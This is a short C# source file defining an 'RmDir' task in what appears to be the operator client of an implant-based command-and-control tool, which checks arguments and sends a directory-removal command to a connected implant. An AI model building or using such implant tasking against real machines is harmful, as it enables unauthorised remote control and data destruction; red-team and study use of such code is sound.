using Client.Models;

using static Client.Models.Client;

namespace Client.Utils
{
    class Rmdir : Models.AdminTask
    {
        private string targetDir { get; set; }
        public override string TaskName => "RmDir";

        public override string Desc => "Removes a directory";

        public override string AdminUtilExec(string[] opts)
        {
            try
            {

                if (opts is null) { throw new ZodException($"[*] Usage: RmDir [targetDir]\n"); }
                if (!(opts.Length == 2)) { throw new ZodException($"[*] Usage: RmDir [targetDir]\n"); }
                if (CurrentImplant is null) { throw new ZodException("[-] No connected implant"); }

                targetDir = opts[1];

                return TaskOps.sendAdminUtil(TaskName, targetDir);
            }
            catch (ZodException e) { return e.Message; }
        }
    }
}
